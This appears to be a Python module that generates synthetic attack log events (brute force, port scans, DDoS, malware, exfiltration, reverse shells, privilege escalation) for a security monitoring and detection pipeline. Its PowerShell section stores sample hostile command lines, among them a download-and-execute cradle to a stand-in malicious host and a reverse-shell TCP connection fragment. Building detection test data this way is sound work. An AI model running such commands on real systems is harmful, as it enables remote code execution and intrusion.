"""
Attack Simulator — generates realistic attack campaigns:
SSH brute force, port scan, DDoS, malware execution, data exfiltration,
reverse shell, unauthorized admin access.
"""
import asyncio
import random
import uuid
import logging
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

ATTACK_PROFILES = [
    "ssh_brute_force",
    "rdp_brute_force",
    "port_scan",
    "ddos_flood",
    "malware_execution",
    "data_exfiltration",
    "reverse_shell",
    "privilege_escalation",
    "impossible_travel",
    "powershell_attack",
]


def _ts():
    return datetime.now(timezone.utc).isoformat()


def _ext_ip():
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


class AttackSimulator:
    def __init__(self, log_generator):
        self.lg = log_generator
        self._running = True

    async def run_attack_campaigns(self):
        logger.info("⚔️  Attack simulator started")
        while self._running:
            attack = random.choice(ATTACK_PROFILES)
            try:
                await self._dispatch(attack)
            except Exception as exc:
                logger.error(f"Attack sim error ({attack}): {exc}")
            # Wait 15–45 seconds between campaigns
            await asyncio.sleep(random.uniform(15, 45))

    async def _dispatch(self, attack_type: str):
        dispatch = {
            "ssh_brute_force": self._ssh_brute_force,
            "rdp_brute_force": self._rdp_brute_force,
            "port_scan": self._port_scan,
            "ddos_flood": self._ddos_flood,
            "malware_execution": self._malware_execution,
            "data_exfiltration": self._data_exfiltration,
            "reverse_shell": self._reverse_shell,
            "privilege_escalation": self._privilege_escalation,
            "impossible_travel": self._impossible_travel,
            "powershell_attack": self._powershell_attack,
        }
        fn = dispatch.get(attack_type)
        if fn:
            await fn()

    async def _inject_logs(self, logs: list):
        """Inject attack logs through the log generator pipeline."""
        from db.database import db_insert
        for log in logs:
            await db_insert("logs", log)
            # UEBA tracking
            if self.lg._ueba and log.get("username"):
                self.lg._ueba.record_event(log)
            if self.lg.detection_engine:
                await self.lg.detection_engine.evaluate(log)
            await self.lg.ws_manager.send_log(log)
            await asyncio.sleep(random.uniform(0.05, 0.15))

    async def _ssh_brute_force(self):
        attacker_ip = _ext_ip()
        target = random.choice(["LINUX-APP-01", "JUMP-BOX-01", "WEB-SRV-01"])
        username = random.choice(["root", "admin", "ubuntu", "ec2-user", "user"])
        attempt_count = random.randint(30, 80)
        logs = []
        for _ in range(attempt_count):
            logs.append({
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "linux_syslog",
                "event_type": "ssh_failed_login",
                "severity": "medium",
                "hostname": target,
                "username": username,
                "source_ip": attacker_ip,
                "facility": "sshd",
                "message": f"[SSH] Failed password for {username} from {attacker_ip} port {random.randint(40000,65535)} ssh2",
                "raw_log": f"sshd[{random.randint(1000,9999)}]: Failed password for {username} from {attacker_ip}",
                "mitre_techniques": ["T1110.001"],
                "country": "Russia",
                "geo_lat": random.uniform(55, 60),
                "geo_lon": random.uniform(35, 40),
                "anomaly_score": round(random.uniform(0.6, 0.9), 4),
                "risk_score": random.randint(60, 85),
                "attack_campaign": "ssh_brute_force",
            })
        await self._inject_logs(logs)
        logger.info(f"⚡ SSH brute force: {attempt_count} attempts from {attacker_ip} → {target}")

    async def _rdp_brute_force(self):
        attacker_ip = _ext_ip()
        target = random.choice(["WORKSTATION-101", "DC01", "WORKSTATION-102"])
        username = random.choice(["administrator", "admin", "user", "rdpuser"])
        attempt_count = random.randint(20, 60)
        logs = []
        for _ in range(attempt_count):
            logs.append({
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "windows_event",
                "event_type": "failed_logon_attempt",
                "event_id": 4625,
                "severity": "medium",
                "hostname": target,
                "username": username,
                "source_ip": attacker_ip,
                "message": f"[RDP Brute] Logon failure for {username} from {attacker_ip} - Logon Type: 10 (RemoteInteractive)",
                "raw_log": f"EventID=4625 SubjectUserName={username} IpAddress={attacker_ip} LogonType=10",
                "mitre_techniques": ["T1110.001", "T1021.001"],
                "country": "China",
                "geo_lat": random.uniform(35, 45),
                "geo_lon": random.uniform(110, 125),
                "anomaly_score": round(random.uniform(0.7, 0.95), 4),
                "risk_score": random.randint(65, 90),
                "attack_campaign": "rdp_brute_force",
            })
        await self._inject_logs(logs)
        logger.info(f"⚡ RDP brute force: {attempt_count} attempts from {attacker_ip} → {target}")

    async def _port_scan(self):
        attacker_ip = _ext_ip()
        target = random.choice(["WEB-SRV-01", "DB-SRV-01", "DC01"])
        ports = random.sample(range(1, 65535), random.randint(50, 200))
        logs = []
        for port in ports:
            logs.append({
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "firewall",
                "event_type": "firewall_deny",
                "severity": "medium",
                "hostname": "FIREWALL-CORE",
                "source_ip": attacker_ip,
                "dest_ip": target,
                "protocol": "TCP",
                "dest_port": port,
                "action": "DENY",
                "message": f"[PortScan] DENY TCP {attacker_ip} → {target}:{port} (SYN)",
                "raw_log": f"action=DENY proto=TCP src={attacker_ip} dst={target} dport={port} flags=SYN",
                "mitre_techniques": ["T1046"],
                "country": "Netherlands",
                "geo_lat": random.uniform(51, 53),
                "geo_lon": random.uniform(4, 7),
                "anomaly_score": round(random.uniform(0.65, 0.85), 4),
                "risk_score": random.randint(50, 75),
                "attack_campaign": "port_scan",
            })
        await self._inject_logs(logs)
        logger.info(f"⚡ Port scan: {len(ports)} ports from {attacker_ip} → {target}")

    async def _ddos_flood(self):
        attacker_ips = [_ext_ip() for _ in range(random.randint(5, 20))]
        target = random.choice(["WEB-SRV-01", "WEB-SRV-02"])
        logs = []
        for _ in range(random.randint(40, 100)):
            src_ip = random.choice(attacker_ips)
            logs.append({
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "web_server",
                "event_type": "http_flood",
                "severity": "high",
                "hostname": target,
                "source_ip": src_ip,
                "http_method": "GET",
                "url_path": "/",
                "status_code": 503,
                "message": f"[DDoS] HTTP flood from {src_ip} → {target} (503 Service Unavailable)",
                "raw_log": f'{src_ip} - - GET / HTTP/1.1 503 -',
                "mitre_techniques": ["T1498.001"],
                "country": random.choice(["Russia", "China", "Iran", "Ukraine"]),
                "geo_lat": random.uniform(-60, 60),
                "geo_lon": random.uniform(-180, 180),
                "anomaly_score": round(random.uniform(0.75, 0.95), 4),
                "risk_score": random.randint(70, 95),
                "attack_campaign": "ddos_flood",
            })
        await self._inject_logs(logs)
        logger.info(f"⚡ DDoS flood: {len(logs)} requests to {target}")

    async def _malware_execution(self):
        hostname = random.choice(["WORKSTATION-101", "ENDPOINT-HR-01", "ENDPOINT-FIN-01"])
        username = random.choice(["jsmith", "mjohnson", "awilliams"])
        malware_processes = [
            "mimikatz.exe", "cobalt_beacon.exe", "meterpreter.exe",
            "ransomware_dropper.exe", "keylogger.exe"
        ]
        process = random.choice(malware_processes)
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "windows_event",
                "event_type": "malware_execution",
                "event_id": 4688,
                "severity": "critical",
                "hostname": hostname,
                "username": username,
                "source_ip": random.choice(["192.168.1.50", "192.168.2.75"]),
                "process": process,
                "message": f"[MALWARE] Suspicious process created: {process} by {username} on {hostname}",
                "raw_log": f"EventID=4688 SubjectUserName={username} NewProcessName=C:\\Windows\\Temp\\{process} ParentProcess=cmd.exe",
                "mitre_techniques": ["T1059.001", "T1055", "T1036.005"],
                "country": None,
                "geo_lat": None,
                "geo_lon": None,
                "anomaly_score": round(random.uniform(0.85, 0.98), 4),
                "risk_score": random.randint(85, 100),
                "attack_campaign": "malware_execution",
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ Malware execution: {process} on {hostname}")

    async def _data_exfiltration(self):
        hostname = random.choice(["DB-SRV-01", "FILE-SRV-01", "WORKSTATION-101"])
        dst_ip = _ext_ip()
        bytes_out = random.randint(50_000_000, 500_000_000)
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "netflow",
                "event_type": "data_exfiltration",
                "severity": "critical",
                "hostname": hostname,
                "source_ip": "192.168.1.100",
                "dest_ip": dst_ip,
                "protocol": "TCP",
                "dest_port": 443,
                "bytes_out": bytes_out,
                "message": f"[EXFIL] Large outbound transfer {bytes_out // 1_000_000}MB from {hostname} to {dst_ip}:443",
                "raw_log": f"src=192.168.1.100 dst={dst_ip} dport=443 bytes_out={bytes_out} duration=120s",
                "mitre_techniques": ["T1041", "T1048"],
                "country": random.choice(["Russia", "China", "Iran"]),
                "geo_lat": random.uniform(30, 60),
                "geo_lon": random.uniform(20, 140),
                "anomaly_score": round(random.uniform(0.88, 0.99), 4),
                "risk_score": random.randint(90, 100),
                "attack_campaign": "data_exfiltration",
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ Data exfiltration: {bytes_out // 1_000_000}MB from {hostname}")

    async def _reverse_shell(self):
        hostname = random.choice(["WEB-SRV-01", "LINUX-APP-01"])
        attacker_ip = _ext_ip()
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "ids_ips",
                "event_type": "reverse_shell",
                "severity": "critical",
                "hostname": "IDS-SENSOR-01",
                "source_ip": hostname,
                "dest_ip": attacker_ip,
                "signature": "ET MALWARE Reverse Shell Connection Outbound",
                "message": f"[REVERSE SHELL] {hostname} initiated reverse shell to {attacker_ip}:4444",
                "raw_log": f"[**] ET MALWARE Reverse Shell [**] {hostname}:54321 -> {attacker_ip}:4444",
                "mitre_techniques": ["T1059", "T1071.001", "T1105"],
                "country": "Russia",
                "geo_lat": 55.75 + random.uniform(-2, 2),
                "geo_lon": 37.61 + random.uniform(-2, 2),
                "anomaly_score": round(random.uniform(0.9, 0.99), 4),
                "risk_score": random.randint(92, 100),
                "attack_campaign": "reverse_shell",
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ Reverse shell: {hostname} → {attacker_ip}")

    async def _privilege_escalation(self):
        hostname = random.choice(["WORKSTATION-101", "WORKSTATION-102", "ENDPOINT-FIN-01"])
        username = random.choice(["jsmith", "mjohnson", "rbrown"])
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "windows_event",
                "event_type": "privilege_escalation",
                "event_id": 4728,
                "severity": "critical",
                "hostname": hostname,
                "username": username,
                "source_ip": "192.168.1.50",
                "message": f"[PRIV ESC] {username} added to Domain Admins group on {hostname}",
                "raw_log": f"EventID=4728 SubjectUserName={username} MemberName={username} TargetUserName=Domain Admins",
                "mitre_techniques": ["T1078.002", "T1098", "T1134"],
                "country": None,
                "geo_lat": None,
                "geo_lon": None,
                "anomaly_score": round(random.uniform(0.87, 0.98), 4),
                "risk_score": random.randint(88, 100),
                "attack_campaign": "privilege_escalation",
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ Privilege escalation: {username} on {hostname}")

    async def _impossible_travel(self):
        username = random.choice(["jsmith", "mjohnson", "chadmin"])
        ip1 = "192.168.1.50"
        ip2 = _ext_ip()
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "auth_log",
                "event_type": "impossible_travel",
                "severity": "high",
                "hostname": "VPN-GW-01",
                "username": username,
                "source_ip": ip2,
                "message": f"[IMPOSSIBLE TRAVEL] {username} logged in from {ip2} (China) 2 mins after login from {ip1} (USA)",
                "raw_log": f"auth: user={username} src_ip={ip2} prev_ip={ip1} time_diff=120s country_diff=China→USA",
                "mitre_techniques": ["T1078", "T1534"],
                "country": "China",
                "geo_lat": 39.90 + random.uniform(-2, 2),
                "geo_lon": 116.39 + random.uniform(-2, 2),
                "anomaly_score": round(random.uniform(0.80, 0.95), 4),
                "risk_score": random.randint(80, 95),
                "attack_campaign": "impossible_travel",
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ Impossible travel: {username}")

    async def _powershell_attack(self):
        hostname = random.choice(["WORKSTATION-101", "ENDPOINT-HR-01", "DC01"])
        username = random.choice(["jsmith", "administrator", "rbrown"])
        payloads = [
            "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0ATgBlAHcA...",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://malware.ru/payload.ps1')",
            "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\"",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\stager.ps1",
        ]
        payload = random.choice(payloads)
        logs = [
            {
                "_id": str(uuid.uuid4()),
                "created_at": _ts(),
                "log_source": "windows_event",
                "event_type": "suspicious_powershell",
                "event_id": 4688,
                "severity": "critical",
                "hostname": hostname,
                "username": username,
                "source_ip": "192.168.1.50",
                "process": "powershell.exe",
                "message": f"[PowerShell Attack] Suspicious encoded command on {hostname} by {username}",
                "raw_log": f"EventID=4688 ProcessName=powershell.exe CommandLine={payload[:100]}",
                "mitre_techniques": ["T1059.001", "T1027", "T1140"],
                "country": None,
                "geo_lat": None,
                "geo_lon": None,
                "anomaly_score": round(random.uniform(0.85, 0.99), 4),
                "risk_score": random.randint(88, 100),
                "attack_campaign": "powershell_attack",
                "powershell_payload": payload,
            }
        ]
        await self._inject_logs(logs)
        logger.info(f"⚡ PowerShell attack on {hostname} by {username}")
